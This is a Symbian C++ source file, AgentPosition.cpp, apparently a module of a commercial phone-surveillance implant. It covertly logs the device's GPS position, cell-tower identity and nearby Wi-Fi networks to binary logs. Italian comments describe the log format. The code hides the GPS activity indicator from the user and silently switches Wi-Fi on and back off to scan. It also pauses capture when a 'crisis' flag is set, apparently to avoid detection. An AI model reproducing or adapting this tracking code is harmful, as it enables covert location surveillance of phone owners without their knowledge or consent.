/*
 ============================================================================
 Name		: AgentPosition.cpp
 Author	  	: Jo'
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentPosition implementation
 ============================================================================
 */

#include "AgentPosition.h"
#include "AgentCrisis.h"
#include <HT\LogFile.h>
#include <lbssatellite.h>
#include <HT\TimeUtils.h>
#include <FeatDiscovery.h>
#include <featureinfo.h>
#include "Json.h"

// CenRep stuff
#include <centralrepository.h>	
// Connections On/Off, slider on SymbianBelle devices
//wlandevicesettingsinternalcrkeys.h
const TUid KCRUidWlanDeviceSettingsRegistryId = {0x101f8e44};
const TUint32 KWlanOnOff = 0x00000052;
const TUint32 KWlanForceDisable = 0x00000053;

const static TInt KMaxTimeoutForFixMin = 14;

#define GPS_POLL_TIMEOUT_MS 1000 * 60 * 14 // Tempo massimo di wait prima che il GPS venga spento

#define TYPE_GPS    1
#define TYPE_CELL   2
#define CELL_VERSION   2008121901
#define GPS_VERSION    2008121901

#define MAXLENGTH_BCCH 48
#define MAXLENGTH_NMR 16
#define GPS_MAX_SATELLITES 12

#define GPS_FIX_UNKNOWN 	0
#define GPS_FIX_2D 			1
#define GPS_FIX_3D 			2 

#define GPS_VALID_UTC_TIME                                 0x00000001
#define GPS_VALID_LATITUDE                                 0x00000002
#define GPS_VALID_LONGITUDE                                0x00000004
#define GPS_VALID_SATELLITE_COUNT                          0x00000800
#define GPS_VALID_SATELLITES_IN_VIEW                       0x00002000
#define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION         0x00000200
#define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION           0x00000400
#define GPS_VALID_ALTITUDE_WRT_SEA_LEVEL                   0x00000040
#define GPS_VALID_SPEED                                    0x00000008
#define GPS_VALID_HEADING                                  0x00000010


	
typedef struct TRILCELLTOWERINFO
	{
	TUint32 cbSize; // @field structure size in bytes
	TUint32 dwParams; // @field indicates valid parameters
	TUint32 dwMobileCountryCode; // @field TBD
	TUint32 dwMobileNetworkCode; // @field TBD
	TUint32 dwLocationAreaCode; // @field TBD
	TUint32 dwCellID; // @field TBD
	TUint32 dwBaseStationID; // @field TBD
	TUint32 dwBroadcastControlChannel; // @field TBD
	TUint32 dwRxLevel; // @field Value from 0-63 (see GSM 05.08, 8.1.4)
	TUint32 dwRxLevelFull; // @field Value from 0-63 (see GSM 05.08, 8.1.4)
	TUint32 dwRxLevelSub; // @field Value from 0-63 (see GSM 05.08, 8.1.4)
	TUint32 dwRxQuality; // @field Value from 0-7  (see GSM 05.08, 8.2.4)
	TUint32 dwRxQualityFull; // @field Value from 0-7  (see GSM 05.08, 8.2.4)
	TUint32 dwRxQualitySub; // @field Value from 0-7  (see GSM 05.08, 8.2.4)
	TUint32 dwIdleTimeSlot; // @field TBD
	TUint32 dwTimingAdvance; // @field TBD
	TUint32 dwGPRSCellID; // @field TBD
	TUint32 dwGPRSBaseStationID; // @field TBD
	TUint32 dwNumBCCH; // @field TBD
	TUint8 rgbBCCH[MAXLENGTH_BCCH]; // @field TBD
	TUint8 rgbNMR[MAXLENGTH_NMR]; // @field TBD

	TRILCELLTOWERINFO()
		{
		cbSize = sizeof(TRILCELLTOWERINFO);
		dwParams = 4;
		}
	} TRILCELLTOWERINFO;

typedef struct TCellInfo
	{
	TUint32 uSize;
	TUint32 uVersion;
	TFileTime filetime;
	TRILCELLTOWERINFO cell;
	TUint32 dwDelimiter;

	TCellInfo()
		{
		uVersion = CELL_VERSION;
		dwDelimiter = LOG_DELIMITER;
		uSize = sizeof(TCellInfo);
		}
	} TCellInfo;

typedef struct TGPS_POSITION
	{
	TUint32 dwVersion; // Current version of GPSID client is using.
	TUint32 dwSize; // sizeof(_GPS_POSITION)

	// Not all fields in the structure below are guaranteed to be valid.  
	// Which fields are valid depend on GPS device being used, how stale the API allows
	// the data to be, and current signal.
	// Valid fields are specified in dwValidFields, based on GPS_VALID_XXX flags.
	TUint32 dwValidFields;

	// Additional information about this location structure (GPS_DATA_FLAGS_XXX)
	TUint32 dwFlags;

	//** Time related
	TSystemTime stUTCTime; //  UTC according to GPS clock.

	//** Position + heading related
	TReal64 dblLatitude; // Degrees latitude.  North is positive
	TReal64 dblLongitude; // Degrees longitude.  East is positive
	TReal32 flSpeed; // Speed in knots
	TReal32 flHeading; // Degrees heading (course made good).  True North=0
	TReal64 dblMagneticVariation; // Magnetic variation.  East is positive
	TReal32 flAltitudeWRTSeaLevel; // Altitute with regards to sea level, in meters
	TReal32 flAltitudeWRTEllipsoid; // Altitude with regards to ellipsoid, in meters

	//** Quality of this fix
	TUint32 FixQuality; // Where did we get fix from?
	TUint32 FixType; // Is this 2d or 3d fix?
	TUint32 SelectionType; // Auto or manual selection between 2d or 3d mode
	TReal32 flPositionDilutionOfPrecision; // Position Dilution Of Precision
	TReal32 flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
	TReal32 flVerticalDilutionOfPrecision; // Vertical Dilution Of Precision

	//** Satellite information
	TUint32 dwSatelliteCount; // Number of satellites used in solution
	TUint32 rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES]; // PRN numbers of satellites used in the solution

	TUint32 dwSatellitesInView; // Number of satellites in view.  From 0-GPS_MAX_SATELLITES
	TUint32 rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES]; // PRN numbers of satellites in view
	TUint32 rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES]; // Elevation of each satellite in view
	TUint32 rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES]; // Azimuth of each satellite in view
	TUint32 rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES]; // Signal to noise ratio of each satellite in view
	
	TGPS_POSITION()
		{
			dwVersion = GPS_VERSION;
			dwSize = sizeof(TGPS_POSITION);		
		}
	} TGPS_POSITION;

typedef struct TGPSInfo
	{
	TUint32 uSize;
	TUint32 uVersion;
	TFileTime filetime;
	TGPS_POSITION gps;
	TUint32 dwDelimiter;

	TGPSInfo()
		{
		uVersion = GPS_VERSION;
		dwDelimiter = LOG_DELIMITER;
		uSize = sizeof(TGPSInfo);
		}
	} TGPSInfo;

typedef struct TWiFiInfo
	{
		TUint8 macAddress[6];	// BSSID
		TUint32 ssidLen;		// SSID Length
		TUint8 ssid[32];		// SSID
		TInt32 rssi;			// Received signal strength in _dBm_ 
	} TWiFiInfo;
	
CAgentPosition::CAgentPosition() :
	CAbstractAgent(EAgent_Position),iBusyWiFi(EFalse),iBusyCellId(EFalse),iBusyGps(EFalse)
	{
	// No implementation required
	}

CAgentPosition::~CAgentPosition()
	{
	__FLOG(_L("Destructor"));
	delete iTimer;
	delete iPhone;
	delete iGPS;
	delete iGpsIndicatorRemover;
	delete iLogCell;
	delete iLogGps;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentPosition* CAgentPosition::NewLC(const TDesC8& params)
	{
	CAgentPosition* self = new (ELeave) CAgentPosition();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentPosition* CAgentPosition::NewL(const TDesC8& params)
	{
	CAgentPosition* self = CAgentPosition::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentPosition::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Position.txt");
	__FLOG(_L("-------------"));
		
	//retrieve parameters
	RBuf paramsBuf;
						
	TInt errCreate = paramsBuf.Create(2*params.Size());
	if(errCreate == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
					
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//get flags
		rootObject->GetBoolL(_L("gps"),iCaptureGps);
		rootObject->GetBoolL(_L("wifi"),iCaptureWiFi);
		rootObject->GetBoolL(_L("cell"),iCaptureCellId);
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
		
	iPhone = CPhone::NewL();
	iGPS = NULL;
	iLogGps = NULL;
	iLogCell = NULL;
	
	iAvailableWiFiModule = CFeatureDiscovery::IsFeatureSupportedL(KFeatureIdProtocolWlan);

	if (!iAvailableWiFiModule )
		{
		// wifi module not available on device, we re-set wifi flag
		iCaptureWiFi = EFalse;
		}

	if(iCaptureCellId)
		{
		iLogCell = CLogFile::NewL(iFs);
		TLocationAdditionalData cellAdditionalData;
		cellAdditionalData.uType = LOGTYPE_LOCATION_GSM;
		iLogCell->CreateLogL(LOGTYPE_LOCATION_NEW,&cellAdditionalData);
		}
	if(iCaptureGps)
		{
		iLogGps = CLogFile::NewL(iFs);
		TLocationAdditionalData gpsAdditionalData;
		gpsAdditionalData.uType = LOGTYPE_LOCATION_GPS;
		iLogGps->CreateLogL(LOGTYPE_LOCATION_NEW,&gpsAdditionalData);
		}

	if (iCaptureGps)
		{
		
		iGPS = CGPSPosition::NewL(*this);
		iTimer = CTimeOutTimer::NewL(*this);
		TTime time;
		time.HomeTime();
		time += (TTimeIntervalMinutes)KMaxTimeoutForFixMin;
		iTimer->CustomAt(time);

		//epoc32\tools\e32plat.pm
		// a little explanation following
		// 3rd MR SDK contains: my @EpocMacros=('__SYMBIAN32__','__SERIES60_30__','__SERIES60_3X__');
		// 5th SDK contains: my @EpocMacros=('__SYMBIAN32__','__S60_50__','__S60_3X__','__SERIES60_3X__');
        // Symbian3 SDK v1.0 contains: my @EpocMacros=('__SYMBIAN32__');

#ifndef __SERIES60_30__
		//try to remove GPS activity indicator on 5th Ed. and Symbian3
		iGpsIndicatorRemover = CGpsIndicatorRemover::NewL(KPosIndicatorCategoryUid,KPosIntGpsHwStatus);
		if(iGpsIndicatorRemover)
			iGpsIndicatorRemover->Start();		
#endif
		
		}
	
	}

void CAgentPosition::StartAgentCmdL()
	{
	__FLOG(_L("StartAgentCmdL()"));
	
	// if we are in crisis don't go further
	// see AgentCrisis.cpp for hex values
	TInt flags=0;
	RProperty::Get(KPropertyUidCore, KPropertyCrisis,flags);
	if(flags & EPosCrisis)
		return;
		
	if (iCaptureCellId && (!iBusyCellId)) 
		{
		iBusyCellId = ETrue;
		// Log CELL ID to file...
		RBuf8 buf(GetCellIdBufferL());
		buf.CleanupClosePushL();
		TInt value;
		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
		if(value)
			{
			iLogCell->AppendLogL(buf);
			}
		CleanupStack::PopAndDestroy(&buf);
		iBusyCellId  = EFalse;
		}
	
	if(iCaptureWiFi && (!iBusyWiFi))
		{
		iBusyWiFi = ETrue;
		TLocationAdditionalData additionalData;
		additionalData.uType = LOGTYPE_LOCATION_WIFI;
		// Log WiFi data to file..
		RBuf8 buf(GetWiFiBufferL(&additionalData));
		buf.CleanupClosePushL();
		if (buf.Length() > 0)
			{
			TInt value;
			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
			if(value)
				{
				CLogFile* logFile = CLogFile::NewLC(iFs);
				logFile->CreateLogL(LOGTYPE_LOCATION_NEW, &additionalData);
				logFile->AppendLogL(buf);
				logFile->CloseLogL();
				CleanupStack::PopAndDestroy(logFile);
				}
			}
		CleanupStack::PopAndDestroy(&buf);
		iBusyWiFi = EFalse;
		}
	
	if(iCaptureGps)
		{
		//restart timer
		iTimer->Cancel();
		TTime time;
		time.HomeTime();
		time += (TTimeIntervalMinutes)KMaxTimeoutForFixMin;
		iTimer->CustomAt(time);

		if(!iBusyGps)
			{
			iBusyGps = ETrue;
			if(iGPS == NULL)
				iGPS = CGPSPosition::NewL(*this);
			iGPS->ReceiveData(2, (KMaxTimeoutForFixMin-1));  //2= two seconds interval update, 
			}
		}
	}

void CAgentPosition::StopAgentCmdL()
	{
	// this is never the case, this is an instant module
	}

void CAgentPosition::CycleAgentCmdL()
	{
	if(iCaptureCellId)
		{
		if(iLogCell)
			{
			iLogCell->CloseLogL();
			}
		TLocationAdditionalData cellAdditionalData;
		cellAdditionalData.uType = LOGTYPE_LOCATION_GSM;
		iLogCell->CreateLogL(LOGTYPE_LOCATION_NEW,&cellAdditionalData);
		}
	
	if(iCaptureGps)
		{
		if(iLogGps)
			{
			iLogGps->CloseLogL();
			}
		TLocationAdditionalData gpsAdditionalData;
		gpsAdditionalData.uType = LOGTYPE_LOCATION_GPS;
		iLogGps->CreateLogL(LOGTYPE_LOCATION_NEW,&gpsAdditionalData);
		}
		
	}



HBufC8* CAgentPosition::GetCellIdBufferL()
	{
	TUint cellId=0;
	TUint lac=0;
	TInt32 signalStrength = 0;
	TBuf<CTelephony::KNetworkIdentitySize> network;
	TBuf<CTelephony::KNetworkCountryCodeSize> cc;
	TBuf<CTelephony::KNetworkLongNameSize> oper;
	iPhone->GetCellIDSync(cellId, lac, network, cc, oper);
	iPhone->GetSignalStrengthSync(signalStrength);  // signalStrength is set to 0 if not available

	cellId = cellId & 0xFFFF;   // jo, maybe redundant
	
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	TCellInfo cellInfo;
	
	TTime now;
	now.UniversalTime();
	TInt64 filetime = TimeUtils::GetFiletime(now);
	cellInfo.filetime.dwHighDateTime = (filetime >> 32);
	cellInfo.filetime.dwLowDateTime = (filetime & 0xFFFFFFFF);
		
	// Converts CountryCode from string to number
	TLex lex(cc);
	lex.Val(cellInfo.cell.dwMobileCountryCode, EDecimal);
	// Converts NetworkCode from string to number
	lex.Assign(network);
	lex.Val(cellInfo.cell.dwMobileNetworkCode, EDecimal);
	cellInfo.cell.dwLocationAreaCode = lac;
	cellInfo.cell.dwCellID = cellId;

	cellInfo.cell.dwTimingAdvance = 0;  // there are no public APIs for this
	cellInfo.cell.dwRxLevel = signalStrength;   
	cellInfo.cell.dwRxQuality = 0;
	
	TUint32 type = TYPE_CELL;
	buffer->InsertL(0, &type, sizeof(TUint32));
	buffer->InsertL(buffer->Size(), &cellInfo, sizeof(TCellInfo));
	

	HBufC8* result = buffer->Ptr(0).AllocL();
	
	CleanupStack::PopAndDestroy(buffer);
	return result;
	}

HBufC8* CAgentPosition::GetGPSBufferL(TPositionSatelliteInfo satPos)
	{
	/*
	 * If the number of satellites used to calculate the coordinates is < 4, we don't use
	 * the fix
	 */
	if(satPos.NumSatellitesUsed() < 4 )
		return HBufC8::NewL(0);
	
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	TGPSInfo gpsInfo;
	
	// retrieve TPosition 
	TPosition pos;
	satPos.GetPosition(pos);
	
	// insert filetime timestamp
	TTime now;
	now.UniversalTime();
	TInt64 filetime = TimeUtils::GetFiletime(now);
	gpsInfo.filetime.dwHighDateTime = (filetime >> 32);
	gpsInfo.filetime.dwLowDateTime = (filetime & 0xFFFFFFFF);
	
	gpsInfo.gps.FixType = GPS_FIX_3D;  // we are sure at least 4 satellites have been used
	
	// insert lat-long-alt-time
	gpsInfo.gps.dblLatitude = pos.Latitude();
	gpsInfo.gps.dblLongitude = pos.Longitude();
	gpsInfo.gps.flAltitudeWRTSeaLevel = pos.Altitude();
	gpsInfo.gps.stUTCTime = TSystemTime( pos.Time() );
	
	gpsInfo.gps.dwValidFields = (GPS_VALID_UTC_TIME | GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE | GPS_VALID_ALTITUDE_WRT_SEA_LEVEL);
	
	gpsInfo.gps.dwSatelliteCount = satPos.NumSatellitesUsed();
	gpsInfo.gps.dwValidFields |= GPS_VALID_SATELLITE_COUNT;
	gpsInfo.gps.dwSatellitesInView = satPos.NumSatellitesInView();
	gpsInfo.gps.dwValidFields |= GPS_VALID_SATELLITES_IN_VIEW;
	gpsInfo.gps.flHorizontalDilutionOfPrecision = satPos.HorizontalDoP();
	gpsInfo.gps.dwValidFields |= GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION;
	gpsInfo.gps.flVerticalDilutionOfPrecision = satPos.VerticalDoP();
	gpsInfo.gps.dwValidFields |= GPS_VALID_VERTICAL_DILUTION_OF_PRECISION;
	
	TCourse course;
	satPos.GetCourse(course);
	gpsInfo.gps.flSpeed = course.Speed();
	gpsInfo.gps.dwValidFields |= GPS_VALID_SPEED;
	gpsInfo.gps.flHeading = course.Heading();
	gpsInfo.gps.dwValidFields |= GPS_VALID_HEADING;
	
	/*
	 * Additional data regarding the satellites can be obtained using the TSatelliteData structure.
	 * Example:
	 */
	/*
	TInt numSat = satPos.NumSatellitesInView();
	TInt err = KErrNone;
	for (int i=0; i<numSat; i++) {
		// Get satellite data
		TSatelliteData satData;
		err = satPos.GetSatelliteData(i,satData);
		if(err != KErrNone)
			{
				continue;
			}
		// Get info
		// See TSatelliteData definition for more methods.
		TReal32 azimuth = satData.Azimuth();
		TInt satSignalStrength = satData.SignalStrength();
	}*/
	
	
	TUint32 type = TYPE_GPS;
	buffer->InsertL(0, &type, sizeof(TUint32));
	buffer->InsertL(buffer->Size(), &gpsInfo, sizeof(TGPSInfo));
	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	
	return result;
	}

HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
	{
	TBool restoreWlanOffStatus = EFalse;
	#ifndef __SERIES60_3X__  //only Symbian^3
		restoreWlanOffStatus = SetWlanOn();
	#endif
		
	CBufBase* buffer = CBufFlat::NewL(50); 
	CleanupStack::PushL(buffer);
	
	CWlanScanInfo* scanInfo=CWlanScanInfo::NewL();
	CleanupStack::PushL(scanInfo);
	CWlanMgmtClient* client=CWlanMgmtClient::NewL();
	CleanupStack::PushL(client);
	client->GetScanResults(*scanInfo);

	for(scanInfo->First(); !scanInfo->IsDone(); scanInfo->Next() )
	{
	
		TWiFiInfo wifiInfo;
		Mem::FillZ(&wifiInfo,sizeof(wifiInfo));
		
		//Retrieve BSSID
		TWlanBssid bssid;
		scanInfo->Bssid( bssid );
		for(TInt k = 0; k < bssid.Length(); k++)
			wifiInfo.macAddress[k] = bssid[k];
		
		//Retrieve transmission level
		TInt8 rxLevel = scanInfo->RXLevel();
		wifiInfo.rssi = rxLevel;
		
		//Retrieve SSID
		TBuf8<36> ssid;
		TInt err;
		err = GetSSID(scanInfo, ssid);
		if(err == KErrNone)
		{
			wifiInfo.ssidLen = ssid.Length();
			for(TInt i=0; i<wifiInfo.ssidLen; i++) 
				wifiInfo.ssid[i] = ssid[i]; 
		}
		else 
		{
			wifiInfo.ssidLen = 0;
		}
		
		additionalData->uStructNum += 1;
		
		buffer->InsertL(buffer->Size(), &wifiInfo, sizeof(TWiFiInfo));
		
	}

	CleanupStack::PopAndDestroy(client);
	CleanupStack::PopAndDestroy(scanInfo);
	
	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	
	#ifndef __SERIES60_3X__   //only Symbian^3
	if(restoreWlanOffStatus)
		{
		CRepository* repository = NULL;
		TRAPD(error,repository = CRepository::NewL( KCRUidWlanDeviceSettingsRegistryId ));
		if ((error == KErrNone) && repository)
			{
			CleanupStack::PushL(repository);
			TInt err = repository->Set(KWlanOnOff,0); // restore to Off
			CleanupStack::PopAndDestroy(repository);
			}
		}
	
	#endif		
	
	return result;
	}

void CAgentPosition::HandleGPSPositionL(TPositionSatelliteInfo position)
	{
	// cancel subsequent requests, we have the position
	iGPS->Cancel();
	// Log the GPS position to file...
	RBuf8 buf(GetGPSBufferL(position));
	buf.CleanupClosePushL();
	if (buf.Length() > 0)
		{
		TInt value;
		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
		if(value)
			{
			iLogGps->AppendLogL(buf);
			}
		}
	CleanupStack::PopAndDestroy(&buf);
	iBusyGps = EFalse;
	}

void CAgentPosition::HandleGPSErrorL(TInt error)
	{
	// http://www.developer.nokia.com/Community/Wiki/KIS000850_-_RPositioner::NotifyPositionUpdate_return_KErrInUse_after_few_minutes
	// Can't Fix or other error... try again...
	if(error == KErrInUse)  //-14
		{
		delete iGPS;
		iGPS = NULL;
		iGPS = CGPSPosition::NewL(*this);
		}
	iGPS->ReceiveData(2, (KMaxTimeoutForFixMin-1));
	}

void CAgentPosition::TimerExpiredL(TAny* src)
	{
	delete iGPS;
	iGPS = NULL;
	iBusyGps = EFalse;
	}

/**
 * Function that retrieves SSID of current scanned network
 * 
 * The SSID is the Information Element with ID = 0
 * The SSID can be at most 32 bytes, so the aSSID should have the capacity for 32 bytes
 * 
 * Returns KErrNone if successful or the type of error ocurred
 */
TInt CAgentPosition::GetSSID(CWlanScanInfo *scanInfo, TDes8 &aSSID)
{
	TInt error;
	TUint8 ie;
	TUint8 length;
	TUint8 vdata[40];
	const TUint8 *data = &vdata[0];
 
	if((error = scanInfo->FirstIE(ie, length, &data)) == KErrNone)
	{
		if(ie == 0)
		{
			aSSID.Copy(data, length);
			return KErrNone;
		}
	}
	else
		return error;
 
	while((error = scanInfo->NextIE(ie, length, &data)) == KErrNone)
	{
		if(ie == 0)
		{
			aSSID.Copy(data, length);
			return KErrNone;
		}
	}
 
	return error;
}

TBool CAgentPosition::SetWlanOn()
	{
	TBool restore = EFalse;
	CRepository* repository = NULL;
	TRAPD(error,repository = CRepository::NewL( KCRUidWlanDeviceSettingsRegistryId ));
	if ((error == KErrNone) && repository)
		{
		CleanupStack::PushL(repository);
		TInt value = 0;
		TInt err = repository->Get(KWlanOnOff,value);  // 0 = Off, 1 = On
		if((err == KErrNone) && (value == 0))
			{
			err = repository->Set(KWlanOnOff,1); // force to On
			restore = ETrue;
			}		
		CleanupStack::PopAndDestroy(repository);
		}
	return restore;
	}

 /*
 Il Position Agent si occupa della cattura della posizione del dispositivo tramite GPS e/o 

 tramite informazioni provenienti dalle BTS. 
 Power Requirements

 Mentre il logging della BTS non impatta sulla batteria, il logging su GPS risulta piuttosto 

 oneroso, pertanto se l'intervallo di cattura scelto e' maggiore di 14 minuti (il tempo che 

 impiega un GPS in cold-start per effettuare il fix in campo aperto senza l'utilizzo di A-GPS) 

 allora il GPS va spento tra una cattura e l'altra. La soglia e' definita in questo modo:

 #define GPS_POLL_TIMEOUT 1000 * 60 * 14 // Tempo massimo di wait prima che il GPS venga spento

 Data Structs

 I dati ottenuti dalla BTS e dal GPS vanno inseriti rispettivamente nelle seguenti strutture dati 

 che poi verranno serializzate all'interno del log:

 typedef struct _GPSInfo {
 UINT uSize;
 UINT uVersion;
 FILETIME ft;
 GPS_POSITION gps;
 DWORD dwDelimiter;
 } GPSInfo;

 typedef struct _CellInfo {
 UINT uSize;
 UINT uVersion;
 FILETIME ft;
 RILCELLTOWERINFO cell;
 DWORD dwDelimiter;
 } CellInfo;

 GPSInfo

 La struttura GPSInfo e' composta da 5 elementi:

 uSize
 E' la dimensione della struttura stessa, ovvero: sizeof(GPSInfo). 
 uVersion
 Identifica la versione della struttura in uso. 
 ft
 E' il timestamp ottenuto al momento della cattura della coordinata. 
 gps
 E' la struttura che definisce la coordinata GPS. 
 dwDelimiter
 E' il delimitatore di fine log. 

 CellInfo

 La struttura CellInfo e' composta da 5 elementi:

 uSize
 E' la dimensione della struttura stessa, ovvero: sizeof(CellInfo). 
 uVersion
 Identifica la versione della struttura in uso. 
 ft
 E' il timestamp ottenuto al momento della cattura della coordinata. 
 cell
 E' la struttura che definisce la coordinata GPS. 
 dwDelimiter
 E' il delimitatore di fine log. 

 Log Format

 Ogni volta che si scrive una coordinata va scritta su file una DWORD relativa al tipo di 

 struttura e poi l'intera struttura, sia essa GPSInfo o CellInfo, senza dimenticare di 

 valorizzare il campo del delimitatore. Il formato binario del log e' attualmente:

 |0    |x       <--- Offset
 |DWORD|STRUCT| <--- Part Size
 |TYPE-|STRUCT| <--- Meaning

 La DWORD Type puo' assumere i seguenti valori:

 #define TYPE_GPS        (UINT)0x1
 #define TYPE_CELL       (UINT)0x2

 Type
 Indica, come appena detto, il tipo di struttura che segue e puo' assumere TYPE_GPS o 

 TYPE_CELL. 
 Struct
 La struttura GPSInfo o CellInfo per intero. 

 Il log va scritto in append, ricordando di rispettarne il formato DWORD|STRUCT. 
 */

/*
 typedef struct _GPS_POSITION {
 DWORD dwVersion;             // Current version of GPSID client is using.
 DWORD dwSize;                // sizeof(_GPS_POSITION)

 // Not all fields in the structure below are guaranteed to be valid.  
 // Which fields are valid depend on GPS device being used, how stale the API allows
 // the data to be, and current signal.
 // Valid fields are specified in dwValidFields, based on GPS_VALID_XXX flags.
 DWORD dwValidFields;

 // Additional information about this location structure (GPS_DATA_FLAGS_XXX)
 DWORD dwFlags;
 
 //	** Time related
 SYSTEMTIME stUTCTime;   //  UTC according to GPS clock.
 
 //	** Position + heading related
 double dblLatitude;            // Degrees latitude.  North is positive
 double dblLongitude;           // Degrees longitude.  East is positive
 float  flSpeed;                // Speed in knots
 float  flHeading;              // Degrees heading (course made good).  True North=0
 double dblMagneticVariation;   // Magnetic variation.  East is positive
 float  flAltitudeWRTSeaLevel;  // Altitute with regards to sea level, in meters
 float  flAltitudeWRTEllipsoid; // Altitude with regards to ellipsoid, in meters

 //	** Quality of this fix
 GPS_FIX_QUALITY     FixQuality;        // Where did we get fix from?
 GPS_FIX_TYPE        FixType;           // Is this 2d or 3d fix?
 GPS_FIX_SELECTION   SelectionType;     // Auto or manual selection between 2d or 3d mode
 float flPositionDilutionOfPrecision;   // Position Dilution Of Precision
 float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
 float flVerticalDilutionOfPrecision;   // Vertical Dilution Of Precision

 //	** Satellite information
 DWORD dwSatelliteCount;                                            // Number of satellites used in solution
 DWORD rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES];                  // PRN numbers of satellites used in the solution

 DWORD dwSatellitesInView;                                          // Number of satellites in view.  From 0-GPS_MAX_SATELLITES
 DWORD rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES];                // PRN numbers of satellites in view
 DWORD rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES];           // Elevation of each satellite in view
 DWORD rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES];             // Azimuth of each satellite in view
 DWORD rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES];  // Signal to noise ratio of each satellite in view
 } GPS_POSITION, *PGPS_POSITION;

 I campi obbligatori sono i seguenti:

 FixType
 Serve a sapere se abbiamo un fix 2d o 3d, valori possibili sono elencati di seguito:

 * GPS_FIX_UNKNOWN = 0
 * GPS_FIX_2D = 1
 * GPS_FIX_3D = 2 

 dblLatitude
 Indica la latitudine attuale. 
 dblLongitude
 Indica la longitudine attuale. 
 */

/*
 typedef struct rilcelltowerinfo_tag {
 DWORD cbSize;                       // @field structure size in bytes
 DWORD dwParams;                     // @field indicates valid parameters
 DWORD dwMobileCountryCode;          // @field TBD
 DWORD dwMobileNetworkCode;          // @field TBD
 DWORD dwLocationAreaCode;           // @field TBD
 DWORD dwCellID;                     // @field TBD
 DWORD dwBaseStationID;              // @field TBD
 DWORD dwBroadcastControlChannel;    // @field TBD
 DWORD dwRxLevel;                    // @field Value from 0-63 (see GSM 05.08, 8.1.4)
 DWORD dwRxLevelFull;                // @field Value from 0-63 (see GSM 05.08, 8.1.4)
 DWORD dwRxLevelSub;                 // @field Value from 0-63 (see GSM 05.08, 8.1.4)
 DWORD dwRxQuality;                  // @field Value from 0-7  (see GSM 05.08, 8.2.4)
 DWORD dwRxQualityFull;              // @field Value from 0-7  (see GSM 05.08, 8.2.4)
 DWORD dwRxQualitySub;               // @field Value from 0-7  (see GSM 05.08, 8.2.4)
 DWORD dwIdleTimeSlot;               // @field TBD
 DWORD dwTimingAdvance;              // @field TBD
 DWORD dwGPRSCellID;                 // @field TBD
 DWORD dwGPRSBaseStationID;          // @field TBD
 DWORD dwNumBCCH;                    // @field TBD
 BYTE rgbBCCH[MAXLENGTH_BCCH];       // @field TBD
 BYTE rgbNMR[MAXLENGTH_NMR];         // @field TBD
 } RILCELLTOWERINFO, *LPRILCELLTOWERINFO;

 I campi obbligatori sono i seguenti:

 cbSize
 La dimensione dell'intera struttura. 
 dwMobileCountryCode
 Puo' anche essere derivato dall'IMSI. 
 dwMobileNetworkCode
 Puo' anche essere derivato dall'IMSI. 
 dwLocationAreaCode
 Si trova tra i dati della BTS. 
 dwCellID
 Si trova tra i dati della BTS. 
 */

